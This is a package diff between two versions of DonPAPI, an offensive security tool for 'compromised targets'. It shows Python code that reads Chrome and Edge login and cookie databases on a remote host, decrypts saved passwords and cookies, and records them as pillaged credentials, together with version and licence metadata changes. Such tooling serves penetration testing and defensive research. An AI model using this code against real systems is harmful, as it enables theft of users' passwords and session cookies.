-			self.logging.debug(	f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [Chrome Decrypt LoginData] {bcolors.ENDC} started for {self.logindata_path}")
+			self.logging.debug(	f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [{self.type} Decrypt LoginData] {bcolors.ENDC} started for {self.logindata_path}")
 			if self.logindata_path!=None:
 				if os.path.isfile(self.logindata_path):
 					connection = sqlite3.connect(self.logindata_path)
 					with connection:
 						cursor = connection.cursor()
 						v = cursor.execute(
 							'SELECT action_url, username_value, password_value FROM logins')
 						value = v.fetchall()
 					self.logging.debug(
-						f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [Chrome Decrypt LoginData] {bcolors.ENDC} got {len(value)} entries")
+						f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [{self.type} Decrypt LoginData] {bcolors.ENDC} got {len(value)} entries")
 					for origin_url, username, password in value:
 						#self.logging.debug(f"[+] Found Chrome data for user {username} : {origin_url} ")
 						self.logins[origin_url]={}
 						self.logins[origin_url]['username']=username
 						self.logins[origin_url]['enc_password']=password
 						self.logins[origin_url]['password']=self.decrypt_chrome_password(password)
 						############PROCESSING DATA
 						self.db.add_credz(credz_type='browser-chrome',
 						                  credz_username=username,
 						                  credz_password=self.logins[origin_url]['password'],
 						                  credz_target=origin_url,
 						                  credz_path='',
 						                  pillaged_from_computer_ip=self.options.target_ip,
 						                  pillaged_from_username=self.username)
-						self.logging.info(	f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [Chrome Password] {bcolors.ENDC} for {origin_url} [ {bcolors.OKBLUE}{self.logins[origin_url]['username']} : {self.logins[origin_url]['password']}{bcolors.ENDC} ]")
+						self.logging.info(	f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [{self.type} Password] {bcolors.ENDC} for {origin_url} [ {bcolors.OKBLUE}{self.logins[origin_url]['username']} : {self.logins[origin_url]['password']}{bcolors.ENDC} ]")
 		except sqlite3.OperationalError as e:
 			e = str(e)
 			if (e == 'database is locked'):
-				print('[!] Make sure Google Chrome is not running in the background')
+				print('[!] Make sure Google Chrome / MS Edge is not running in the background')
 			elif (e == 'no such table: logins'):
 				print('[!] Something wrong with the database name')
 			elif (e == 'unable to open database file'):
 				print('[!] Something wrong with the database path')
 			else:
 				print(e)
 			return None
 
 		return self.logins
 
 	def decrypt_chrome_CookieData(self):
 		#path = '192.168.20.141\\Users\\Administrateur.TOUF\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
 		try:
 			if self.cookie_path!=None:
-				self.logging.debug(f"[{self.options.target_ip}] [+] Decrypting Chrome cookie in {self.cookie_path}")
+				self.logging.debug(f"[{self.options.target_ip}] [+] Decrypting {self.type} cookie in {self.cookie_path}")
 				if os.path.isfile(self.cookie_path):
 					connection = sqlite3.connect(self.cookie_path)
 					with connection:
 						cursor = connection.cursor()
 						v = cursor.execute(
 							'select host_key, "TRUE", path, "FALSE", expires_utc, name, encrypted_value from cookies')
 						values = v.fetchall()
 
-					self.logging.debug(f"[{self.options.target_ip}] [+] Found {len(values)} Chrome cookies")
+					self.logging.debug(f"[{self.options.target_ip}] [+] Found {len(values)} {self.type} cookies")
 					for host_key, _, path, _, expires_utc, name, encrypted_value in values:
-						self.logging.debug(f"[{self.options.target_ip}] [+] Found Chrome cookie for {host_key}, cookie name: {name}, expire at utc :{(datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).strftime('%b %d %Y %H:%M:%S')}")
+						self.logging.debug(f"[{self.options.target_ip}] [+] Found {self.type} cookie for {host_key}, cookie name: {name}, expire at utc :{(datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).strftime('%b %d %Y %H:%M:%S')}")
 						self.cookies[host_key]={}
 						self.cookies[host_key][name]=self.decrypt_chrome_password(encrypted_value)
 						############PROCESSING DATA
 						self.db.add_cookies(credz_type='browser-chrome',
 						                  credz_name=name,
 						                  credz_value=self.cookies[host_key][name],
 						                  credz_expires_utc=expires_utc,
 									      credz_target=host_key,
 						                  credz_path='',
 						                  pillaged_from_computer_ip=self.options.target_ip,
 						                  pillaged_from_username=self.username)
-						self.logging.info(f"[{self.options.target_ip}] [+]  {bcolors.OKGREEN}[Chrome Cookie] {bcolors.ENDC} for {host_key} {bcolors.OKBLUE}[ {name}:{self.cookies[host_key][name]} ] {bcolors.ENDC} expire time: {(datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).strftime('%b %d %Y %H:%M:%S')}")
+						self.logging.info(f"[{self.options.target_ip}] [+]  {bcolors.OKGREEN}[{self.type} Cookie] {bcolors.ENDC} for {host_key} {bcolors.OKBLUE}[ {name}:{self.cookies[host_key][name]} ] {bcolors.ENDC} expire time: {(datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).strftime('%b %d %Y %H:%M:%S')}")
 
 		except sqlite3.OperationalError as e:
 			e = str(e)
 			if (e == 'database is locked'):
-				self.logging.debug(f"[{self.options.target_ip}] [!] Make sure Google Chrome is not running in the background")
+				self.logging.debug(f"[{self.options.target_ip}] [!] Make sure Google {self.type} is not running in the background")
 			elif (e == 'no such table: logins'):
 				self.logging.debug(f"[{self.options.target_ip}] [!] Something wrong with the database name")
 			elif (e == 'unable to open database file'):
 				self.logging.debug(f"[{self.options.target_ip}] [!] Something wrong with the database path")
 			self.logging.debug(f"[{self.options.target_ip}] {e}")
 			return None
 
 		return self.cookies
 
 
 	def get_chrome_Version(self):
 		try:
 			if self.version_path!=None:
-				self.logging.debug(f"[{self.options.target_ip}] [+] Getting Chrome version in {self.version_path}")
+				self.logging.debug(f"[{self.options.target_ip}] [+] Getting {self.type} version in {self.version_path}")
 
 				if os.path.isfile(self.version_path):
 					f=open(self.version_path,'rb')
 					self.version = f.read().decode('utf8')
 					f.close()
 					self.db.add_browser_version(browser_type='browser-chrome',
 						                  version=self.version,
 						                  pillaged_from_computer_ip=self.options.target_ip,
 						                  pillaged_from_username=self.username)
-					self.logging.info(f"[{self.options.target_ip}] [+]  {bcolors.OKGREEN}[Chrome Version] {bcolors.ENDC}  {bcolors.OKBLUE}{self.version} {bcolors.ENDC}")
+					self.logging.info(f"[{self.options.target_ip}] [+]  {bcolors.OKGREEN}[{self.type} Version] {bcolors.ENDC}  {bcolors.OKBLUE}{self.version} {bcolors.ENDC}")
 
 		except Exception as ex:
 			self.logging.debug(
-				f"[{self.options.target_ip}] {bcolors.WARNING}Exception Getting Blob for Chrome{bcolors.ENDC}")
+				f"[{self.options.target_ip}] {bcolors.WARNING}Exception Getting Blob for {self.type}{bcolors.ENDC}")
 			self.logging.debug(ex)
 
 		return self.version
```

### Comparing `donpapi-1.0.1/donpapi/software/browser/firefox_decrypt.py` & `donpapi-1.1.0/donpapi/software/browser/firefox_decrypt.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/software/browser/mozilla.py` & `donpapi-1.1.0/donpapi/software/browser/mozilla.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/software/manager/keepass.py` & `donpapi-1.1.0/donpapi/software/manager/keepass.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/software/manager/lastpass.py` & `donpapi-1.1.0/donpapi/software/manager/lastpass.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/software/manager/mRemoteNG-local.py` & `donpapi-1.1.0/donpapi/software/manager/mRemoteNG-local.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/software/manager/mRemoteNG.py` & `donpapi-1.1.0/donpapi/software/manager/mRemoteNG.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/software/sysadmin/d3des.py` & `donpapi-1.1.0/donpapi/software/sysadmin/d3des.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/software/sysadmin/mobaxterm.py` & `donpapi-1.1.0/donpapi/software/sysadmin/mobaxterm.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/software/sysadmin/putty.py` & `donpapi-1.1.0/donpapi/software/sysadmin/putty.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/software/sysadmin/vnc-local.py` & `donpapi-1.1.0/donpapi/software/sysadmin/vnc-local.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/software/sysadmin/vnc.py` & `donpapi-1.1.0/donpapi/software/sysadmin/vnc.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/software/sysadmin/winscp.py` & `donpapi-1.1.0/donpapi/software/sysadmin/winscp.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/pyproject.toml` & `donpapi-1.1.0/pyproject.toml`

 * *Files 11% similar despite different names*

```diff
@@ -1,15 +1,16 @@
 [tool.poetry]
 name = "donpapi"
-version = "1.0.1"
+version = "1.1.0"
 description = "Dumping revelant information on compromised targets without AV detection"
 authors = ["Login Securite <contact@login-securite.com>"]
 readme = "readme.md"
 homepage = "https://github.com/login-securite/DonPAPI"
 repository = "https://github.com/login-securite/DonPAPI"
+license = "'GNU (GPLv3)"
 exclude = []
 include = ["donpapi/config/*", "donpapi/res/*"]
 classifiers = [
     'Environment :: Console',
     'Programming Language :: Python :: 3',
     'Topic :: Security',
 ]
```

### Comparing `donpapi-1.0.1/readme.md` & `donpapi-1.1.0/readme.md`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/PKG-INFO` & `donpapi-1.1.0/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,16 +1,18 @@
 Metadata-Version: 2.1
 Name: donpapi
-Version: 1.0.1
+Version: 1.1.0
 Summary: Dumping revelant information on compromised targets without AV detection
 Home-page: https://github.com/login-securite/DonPAPI
+License: 'GNU (GPLv3)
 Author: Login Securite
 Author-email: contact@login-securite.com
 Requires-Python: >=3.9,<4.0
 Classifier: Environment :: Console
+Classifier: License :: Other/Proprietary License
 Classifier: Programming Language :: Python :: 3
 Classifier: Programming Language :: Python :: 3.9
 Classifier: Programming Language :: Python :: 3.10
 Classifier: Programming Language :: Python :: 3.11
 Classifier: Topic :: Security
 Requires-Dist: LnkParse3 (>=1.2.0,<2.0.0)
 Requires-Dist: M2Crypto (>=0.38.0,<0.39.0)
```

